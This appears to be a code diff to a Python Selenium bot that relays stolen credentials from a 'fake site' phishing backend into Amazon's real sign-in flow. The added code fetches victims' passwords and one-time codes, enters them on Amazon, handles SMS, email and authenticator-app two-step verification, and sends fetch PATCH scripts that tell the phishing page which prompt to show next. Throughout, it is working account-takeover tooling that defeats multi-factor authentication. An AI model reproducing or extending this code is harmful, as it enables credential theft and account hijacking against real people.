@@ -97,17 +97,23 @@ class Abrowser(object):
                 if accs_who_need is not None:
                     for acc in accs_who_need:
                         if acc["status"] == "Need password":
-                            self.get_acc_password(int(acc["id"]))
+                            self.get_acc_password(int(acc["user_id"]), int(acc["id_db"]))
+                            pass
+                        elif acc["status"] == "Need chose phone or email":
+                            self.get_acc_chose_phone_or_email(int(acc["user_id"]), int(acc["id_db"]))
                             pass
                         elif acc["status"] == "Need otp code":
+                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                             pass
                         elif acc["status"] == "Need zip code":
                             pass
                         elif acc["status"] == "Need email code":
+                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                             pass
                         elif acc["status"] == "Need phone code":
+                            self.get_acc_get_otp_code(int(acc["user_id"]), int(acc["id_db"]))
                             pass
-                time.sleep(3)
+                time.sleep(1)
             self.quit()
         except Exception as ex:
             self.print(ex)
@@ -115,28 +121,81 @@ class Abrowser(object):
             return
 
 
-    def get_acc_password(self, id: int):
+    def get_acc_password(self, user_id: int, id_db: int):
         try:
             self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20authentication")
-            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
+            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
             json_el = json.loads(el.text[8:-1])
             newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
             for d in newlist:
                 acc_id = d["id"]
-                if int(acc_id) != id:
-                    continue
-                acc_password = d["password"]
-                a_db.acc_set_password(int(acc_id), acc_password)
-                self.print(f"Set password {acc_password} to acc id_db {acc_id}")
+                if int(acc_id) == user_id:
+                    acc_password = d["password"]
+                    a_db.acc_set_password(id_db, acc_password)
+                    self.print(f"Set password {acc_password} to acc id_db {id_db}")
+                    break
+                else:
+                    # self.print(f"{int(acc_id)} != {user_id}")
+                    continue  
             pass
         except Exception as ex:
             self.print(ex)
             self.quit()
             return
+
+    def get_acc_chose_phone_or_email(self, user_id: int, id_db: int):
+        try:
+            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=authenticated")
+            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
+            json_el = json.loads(el.text[8:-1])
+            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
+            for d in newlist:
+                acc_id = d["id"]
+                if int(acc_id) == user_id:
+                    acc_verification_type= d["verification_type"]
+                    if "email/phone" in acc_verification_type:
+                        pass
+                    elif "email" in acc_verification_type:
+                        a_db.acc_change_status(id_db, "Selected email")
+                        pass
+                    elif "phone" in acc_verification_type:
+                        a_db.acc_change_status(id_db, "Selected phone")
+                        pass
+                    break
+                else:
+                    # self.print(f"{int(acc_id)} != {user_id}")
+                    continue 
+            pass
+        except Exception as ex:
+            self.print(ex)
+            self.quit()
+            return
+
+    def get_acc_get_otp_code(self, user_id: int, id_db: int):
+        try:
+            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20verification")
+            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
+            json_el = json.loads(el.text[8:-1])
+            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
+            for d in newlist:
+                acc_id = d["id"]
+                if int(acc_id) == user_id:
+                    acc_verification_code = d["verification_code"]
+                    a_db.acc_set_code_otp(id_db, str(acc_verification_code))
+                    break
+                else:
+                    # self.print(f"{int(acc_id)} != {user_id}")
+                    continue 
+            pass
+        except Exception as ex:
+            self.print(ex)
+            self.quit()
+            return
+            
     def get_new_users(self):
         try:
             self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
-            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
+            el = WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
             json_el = json.loads(el.text[8:-1])
             newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
             # self.print(newlist)
@@ -181,7 +240,7 @@ class Abrowser(object):
             self.driver.get(f"https://www.amazon.com/")
             self.print("I get Amazon!!!")
             try:
-                el_nav_ya_signin = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//a[@data-nav-ref = 'nav_ya_signin']")))
+                el_nav_ya_signin = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//a[@data-nav-ref = 'nav_ya_signin']")))
             except Exception as ex:
                 raise Exception("Not find el_nav_ya_signin")
 
@@ -191,12 +250,12 @@ class Abrowser(object):
             self.print(f"After click on el_nav_ya_signin {self.driver.current_url}")
 
             try:
-                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
+                el_input_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
             except Exception as ex:
                 raise Exception("Not find el_input_email")
 
             try:
-                el_input_submit= WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                el_input_submit= WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
             except Exception as ex:
                 raise Exception("Not find el_input_submit")
 
@@ -207,12 +266,12 @@ class Abrowser(object):
             actions.pause(random.randint(1, 2))
             actions.click()
             actions.perform()
-            # self.print(f"After click on el_input_submit {self.driver.current_url}")
+            self.print(f"After click on el_input_submit email {self.driver.current_url}")
 
-            time.sleep(3)
+            time.sleep(1)
             is_exept = False
             try:
-                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
+                el_input_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
             except Exception as ex:
                 self.print(ex)
                 is_exept = True
@@ -220,15 +279,7 @@ class Abrowser(object):
 
             if is_exept is True:
                 url_to_email_check_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_error"
-                script_data = f"fetch('{url_to_email_check_error}'," + """{
-                        method: 'PATCH',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ 
-                            error_message: 'We cannot find an account with that email address 
-                        })
-                    })"""
+                script_data = f"fetch('{url_to_email_check_error}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error_message: 'We cannot find an account with that email address }) })"
                 a_db.add_executed_code(script_data)
                 raise Exception("Bad email")
 
@@ -241,6 +292,7 @@ class Abrowser(object):
                 if self.is_end_work() is True:
                     self.quit()
                     return
+                # self.print(f"a_db.acc_get_password({self.user_id_db})")
                 password = a_db.acc_get_password(self.user_id_db)
                 if password is None:
                     time.sleep(1)
@@ -250,44 +302,36 @@ class Abrowser(object):
                 
                 if first_try_password == True:
                     try:
-                        el_rememberMe = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
+                        el_rememberMe = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
                     except Exception as ex:
                         raise Exception("el_rememberMe")
                     el_rememberMe.click()
                     first_try_password = False
 
                 try:
-                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
+                    el_password = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                 except Exception as ex:
                     raise Exception("el_password")
                 self.driver.execute_script(f"arguments[0].setAttribute('value','{self.password}')", el_password)
 
                 try:
-                    el_signInSubmit = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                    el_signInSubmit = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
                 except Exception as ex:
                     raise Exception("el_signInSubmit")
 
                 el_signInSubmit.click()
                 time.sleep(3)
-
+                self.print(f"After click on el_signInSubmit password {self.driver.current_url}")
                 is_exept = False
                 try:
-                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
+                    el_password = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
                 except Exception as ex:
                     is_exept = True
                     self.print(ex)
                 
-                if is_exept is True:
+                if is_exept is False:
                     url_to_email_auth_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_error"
-                    script_data = f"fetch('{url_to_email_auth_error}'," + """{
-                            method: 'PATCH',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ 
-                                error_message: 'Your password is incorrect
-                            })
-                        })"""
+                    script_data = f"fetch('{url_to_email_auth_error}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error_message: 'Your password is incorrect }) })"
                     a_db.acc_set_password(self.user_id_db, "None")
                     a_db.add_executed_code(script_data)
                     a_db.acc_change_status(self.user_id_db, "Need password")
@@ -295,8 +339,250 @@ class Abrowser(object):
                     continue
                 break
             
-            
-            
+            if "Authentication required" in self.driver.page_source:
+                self.print("Authentication required")
+                is_chosed = False
+                if "We will email you a One Time Password" in self.driver.page_source:
+                    self.print("We will email you a One Time Password")
+                    try:
+                        el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                    except Exception as ex:
+                        raise Exception("el_submit_send_code")
+                    el_submit_send_code.click()
+
+                    time.sleep(1)
+                if "We will send you a One Time Password" in self.driver.page_source or "How would you like" in self.driver.page_source:
+                    self.print("We will send you a One Time Password | or | How would you like")
+                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
+                    script_data = f"fetch('{url_to_auth_success}'," + "{method: 'PATCH',headers: { 'Content-Type': 'application/json'}, body: JSON.stringify({ verification_type: 'email/phone'})})"
+                    a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need chose phone or email")
+                    # Selected phone, Selected email
+                    while True:
+                        if self.is_end_work() is True:
+                            self.quit()
+                            return
+                        
+                        status = a_db.acc_get_status(self.user_id_db)
+
+                        if "Selected phone" in status:
+                            try:
+                                el_chose_phone = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@value = 'sms']")))
+                            except Exception as ex:
+                                raise Exception("el_chose_phone")
+                            el_chose_phone.click()
+                            time.sleep(1)
+                            try:
+                                el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                            except Exception as ex:
+                                raise Exception("el_submit_send_code")
+                            el_submit_send_code.click()
+
+                            time.sleep(1)
+                            # html_source = "One Time Password (OTP) sent to +"
+                            is_chosed = True
+                            break
+                        elif "Selected email" in status:
+                            try:
+                                el_chose_email = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@value = 'email']")))
+                            except Exception as ex:
+                                raise Exception("el_chose_email")
+                            el_chose_email.click()
+                            time.sleep(1)
+                            try:
+                                el_submit_send_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                            except Exception as ex:
+                                raise Exception("el_submit_send_code")
+                            el_submit_send_code.click()
+
+                            time.sleep(1)
+                            # html_source = "One Time Password (OTP) sent to "
+                            is_chosed = True
+                            break
+                        else:
+                            time.sleep(1)
+                            continue
+                    pass
+                if "One Time Password (OTP) sent to +" in self.driver.page_source:
+                    self.print("One Time Password (OTP) sent to +")
+                    if is_chosed is False:
+                        url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
+                        script_data = f"fetch('{url_to_auth_success}'," + "{method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'phone' }) })"
+                        a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need phone code")
+                    while True:
+                        if self.is_end_work() is True:
+                            self.quit()
+                            return
+                        
+                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
+                        if code_otp is None:
+                            time.sleep(1)
+                            continue
+
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
+                        except Exception as ex:
+                            raise Exception("el_input_code")
+                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
+                        time.sleep(1)
+                        try:
+                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                        except Exception as ex:
+                            raise Exception("el_submit_enter_code")
+                        el_submit_enter_code.click()
+                        time.sleep(1)
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
+                            raise Exception("Find el_input_code")
+                        except Exception as ex:
+                            pass
+                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
+                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
+                        a_db.add_executed_code(script_data)
+                        a_db.acc_change_status(self.user_id_db, "verification_success")
+                    pass
+                elif "One Time Password (OTP) sent to " in self.driver.page_source:
+                    self.print("One Time Password (OTP) sent to ")
+                    if is_chosed is False:
+                        url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
+                        script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'email' }) })"
+                        a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need email code")
+                    while True:
+                        if self.is_end_work() is True:
+                            self.quit()
+                            return
+                        
+                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
+                        if code_otp is None:
+                            time.sleep(1)
+                            continue
+
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
+                        except Exception as ex:
+                            raise Exception("el_input_code")
+                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
+                        time.sleep(1)
+                        try:
+                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                        except Exception as ex:
+                            raise Exception("el_submit_enter_code")
+                        el_submit_enter_code.click()
+                        time.sleep(1)
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'code']")))
+                            raise Exception("Find el_input_code")
+                        except Exception as ex:
+                            pass
+                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
+                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
+                        a_db.add_executed_code(script_data)
+                        a_db.acc_change_status(self.user_id_db, "verification_success")
+                    pass
+                else:
+                    raise Exception("Cant detect  Authentication required")
+            elif "Two-Step Verification" in self.driver.page_source:
+                self.print("Two-Step Verification")
+                if "sent to a phone number" in self.driver.page_source:
+                    # input name="rememberDevice"
+                    # input name="otpCode"
+                    # input name="mfaSubmit"
+                    self.print("sent to a phone number")
+                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
+                    script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'phone' }) })"
+                    a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need phone code")
+                    while True:
+                        if self.is_end_work() is True:
+                            self.quit()
+                            return
+                        
+                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
+                        if code_otp is None:
+                            time.sleep(1)
+                            continue
+                        
+                        try:
+                            el_input_rememberDevice = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberDevice']")))
+                        except Exception as ex:
+                            raise Exception("el_input_rememberDevice")
+                        el_input_rememberDevice.click()
+                        time.sleep(1)
+                        
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
+                        except Exception as ex:
+                            raise Exception("el_input_code")
+                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
+                        time.sleep(1)
+                        try:
+                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                        except Exception as ex:
+                            raise Exception("el_submit_enter_code")
+                        el_submit_enter_code.click()
+                        time.sleep(1)
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
+                            raise Exception("Find el_input_code")
+                        except Exception as ex:
+                            pass
+                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
+                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
+                        a_db.add_executed_code(script_data)
+                        a_db.acc_change_status(self.user_id_db, "verification_success")
+                    pass
+                elif "generated by your Authenticator App" in self.driver.page_source:
+                    self.print("generated by your Authenticator App")
+                    url_to_auth_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_success"
+                    script_data = f"fetch('{url_to_auth_success}'," + "{ method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ verification_type: 'otp' }) })"
+                    a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need otp code")
+                    while True:
+                        if self.is_end_work() is True:
+                            self.quit()
+                            return
+                        
+                        code_otp = a_db.acc_get_code_otp(self.user_id_db)
+                        if code_otp is None:
+                            time.sleep(1)
+                            continue
+                        
+                        try:
+                            el_input_rememberDevice = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberDevice']")))
+                        except Exception as ex:
+                            raise Exception("el_input_rememberDevice")
+                        el_input_rememberDevice.click()
+                        time.sleep(1)
+                        
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
+                        except Exception as ex:
+                            raise Exception("el_input_code")
+                        self.driver.execute_script(f"arguments[0].setAttribute('value','{code_otp}')", el_input_code)
+                        time.sleep(1)
+                        try:
+                            el_submit_enter_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                        except Exception as ex:
+                            raise Exception("el_submit_enter_code")
+                        el_submit_enter_code.click()
+                        time.sleep(1)
+                        try:
+                            el_input_code = WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'otpCode']")))
+                            raise Exception("Find el_input_code")
+                        except Exception as ex:
+                            pass
+                        url_to_verification_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/verification_success"
+                        script_data = f"fetch('{url_to_verification_success}'," + "{ method: 'PATCH' })"
+                        a_db.add_executed_code(script_data)
+                        a_db.acc_change_status(self.user_id_db, "verification_success")
+                    pass
+                else:
+                    raise Exception("Cant detect Two-Step Verification")
+            else:
+                raise Exception("NOT Authentication required and NOT Two-Step Verification")
+
             time.sleep(20)
         except Exception as ex:
             self.print(ex)
